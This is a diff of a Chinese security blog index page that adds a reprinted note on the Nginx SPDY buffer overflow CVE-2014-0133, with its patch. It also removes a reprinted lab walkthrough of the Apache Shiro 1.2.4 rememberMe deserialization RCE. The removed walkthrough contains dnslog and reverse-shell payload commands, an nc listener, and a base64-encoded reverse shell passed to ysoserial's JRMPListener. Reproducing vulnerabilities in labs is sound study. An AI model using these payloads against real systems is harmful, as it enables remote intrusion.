@@ -82,6 +82,50 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/15/CVE-2014-0133-Nginx/">
+                CVE-2014-0133-Nginx
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="nginx-spdy缓冲区溢出漏洞">Nginx SPDY缓冲区溢出漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53008479/article/details/124755846">山兔1</a> 并作补充</p>
+</blockquote>
+<h2><span id="注意">注意</span></h2><blockquote>
+<p>nginx SPDY实现存在基于堆的缓冲区溢出，允许攻击者利用漏洞提交特殊的请求使应用程序崩溃或执行任意代码。</p>
+<p>如果是漏扫，扫出来的话，是没有用的，它是根据版本来确认nginx是否存在的漏洞的，具体得登陆服务器上看。</p>
+</blockquote>
+<h2><span id="成因">成因</span></h2><blockquote>
+<p>Nginx 1.3.15 - 1.5.11 的版本都收此漏洞影响，原因是如果<code>listen</code>指令中的<code>spdy</code>选项被配置文件所调用，则编译时会使用<code>ngx_http_spdy_module</code>模块（默认不编译），并且没有<code>--with-debug</code>配置选项。</p>
+</blockquote>
+<h2><span id="修复">修复</span></h2><blockquote>
+<p>此漏洞已在 Nginx 1.5.12 及 1.4.7 后被修复，问题补丁如下：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--- src/http/ngx_http_spdy.c</span><br><span class="line">+++ src/http/ngx_http_spdy.c</span><br><span class="line">@@ -1849,7 +1849,7 @@ static u_char *</span><br><span class="line"> ngx_http_spdy_state_save(ngx_http_spdy_connection_t *sc,</span><br><span class="line">     u_char *pos, u_char *end, ngx_http_spdy_handler_pt handler)</span><br><span class="line"> &#123;</span><br><span class="line">-#if (NGX_DEBUG)</span><br><span class="line">+#if 1</span><br><span class="line">     if (end - pos &gt; NGX_SPDY_STATE_BUFFER_SIZE) &#123;</span><br><span class="line">         ngx_log_error(NGX_LOG_ALERT, sc-&gt;connection-&gt;log, 0,</span><br><span class="line">                       &quot;spdy state buffer overflow: &quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>请更新 <a target="_blank" rel="noopener" href="https://nginx.org/en/download.html">Nginx 版本</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/15/Momentum-2/">
                 Momentum 2
             </a>
@@ -2960,125 +3004,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/08/Shiro-RememberMe-1-2-4/">
-                Shiro RememberMe 1.2.4
-            </a>
-        </h2>
-    
-    <time>
-        Aug 8, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shiro-rememberme-124-反序列化命令执行漏洞复现-kali-docker">Shiro RememberMe 1.2.4 反序列化命令执行漏洞复现 kali docker</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44067239/article/details/106918315">莫憨憨</a></p>
-</blockquote>
-<h3><span id="影响版本apache-shiro-ltx3d-124">影响版本：Apache Shiro &lt;&#x3D; 1.2.4</span></h3><h2><span id="漏洞产生原因">漏洞产生原因:</span></h2><blockquote>
-<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。使用大佬脚本生成 payload(ysoserial.jar文件和运行目录处于同一目录)</p>
-</blockquote>
-<h2><span id="漏洞环境搭建">漏洞环境搭建</span></h2><h3><span id="1拉取镜像">1.拉取镜像</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<h3><span id="2启动环境">2.启动环境</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 -p 7777:6666 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>如需进入环境，命令为</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it name /bin/bash</span><br></pre></td></tr></table></figure>
-
-<h3><span id="3web访问">3.web访问</span></h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a> 能看到如下页面即可</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/1.png" alt="image"></p>
-<p>或虚拟机外面用真实ip访问</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/2.png" alt="image"></p>
-<p>至此漏洞环境搭建成功</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><h3><span id="1抓包测试">1.抓包测试</span></h3><blockquote>
-<p>查看返回包里setcookie有rememberme的字样</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="2继续测试">2.继续测试</span></h3><blockquote>
-<p>首先最简单的测试方法是用dnslog，看看是否有回显。<br>利用POC生成想要执行的命令对应的rememberMe</p>
-</blockquote>
-<h3><span id="3工具准备">3.工具准备</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/4.png" alt="image"></p>
-<p>生成payload的脚本使用的是python3,运行报错就安装一下模块</p>
-</blockquote>
-<h3><span id="4生成payload">4.生成payload：</span></h3><blockquote>
-<p>双引号中是想要执行的命令，如果这里没有公网VPS，就用dnslog来证明。攻击原理一样，不认可的杠精可直接怼</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;ping 39p2wo.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>运行结果如下图：</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/5.png" alt="image"></p>
-<p>然后便会在脚本所在目录下生成文件payload.cookie</p>
-</blockquote>
-<h3><span id="5回到浏览器抓包">5.回到浏览器抓包</span></h3><blockquote>
-<p>用payload.cookie中的rememberMe内容加入Cookie中，或者直接放进参数中，提交看页面回显和dnslog页面是否有数据过去</p>
-</blockquote>
-<h3><span id="6到ceye平台查看日志记录">6.到ceye平台查看日志记录</span></h3><blockquote>
-<p>dnslog日志刷新后有记录了，说明payloda执行成功</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/6.png" alt="image"></p>
-</blockquote>
-<h2><span id="反弹shell">反弹shell</span></h2><blockquote>
-<p>当然了，有VPS的情况下，为何不反弹一下shell呢？</p>
-</blockquote>
-<h3><span id="1使用脚本生成key">1.使用脚本生成key</span></h3><blockquote>
-<p>反弹shell的命令：<code>bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 shiro_1.2.4.py <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/22.45.13.9/7878 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>PS：ip假的，不打码，观看流畅</p>
-</blockquote>
-<h3><span id="2先公网vps监听反弹shell的命令">2.先公网VPS监听反弹shell的命令</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7878</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/7.png" alt="image"></p>
-</blockquote>
-<h3><span id="3加入payload提交数据包">3.加入payload，提交数据包</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/8.png" alt="image"></p>
-<p>这里使用curl也能达到burp的效果</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加 -I 是只看响应头，这里主要关注set-cookie:rememberMe</span><br><span class="line">curl -X GET http://172.16.12.132 --cookie “xxxxxxxxxxxxx” -I</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>讲这个是因为此方法可以用来初步探测shiro信息</p>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/9.png" alt="image"></p>
-</blockquote>
-<h3><span id="4vps收到了反弹回来的shell">4.vps收到了反弹回来的shell</span></h3><blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/10.png" alt="image"></p>
-</blockquote>
-<h2><span id="题外话1">题外话1</span></h2><blockquote>
-<p>研究这个漏洞，是因为客户要求排查下资产，然后找不到集成的工具和一键式检查的。<br>漏洞的事情OK了，还是觉得自己太菜，要是代码够给力，写个集成的丢github上就真的香。</p>
-</blockquote>
-<h2><span id="题外话2">题外话2</span></h2><blockquote>
-<p>还有一个思路，看大佬文章时，这里一直没搞懂。字面意思是用ysoserial中的JRMP监听模块来搞定的，后续学会了再补上笔记</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2022/08/08/Shiro-RememberMe-1-2-4/11.png" alt="image"></p>
-</blockquote>
-<h2><span id="参考链接">参考链接：</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0007eafd1f92">https://www.jianshu.com/p/0007eafd1f92</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/112742.html">https://www.secpulse.com/archives/112742.html</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
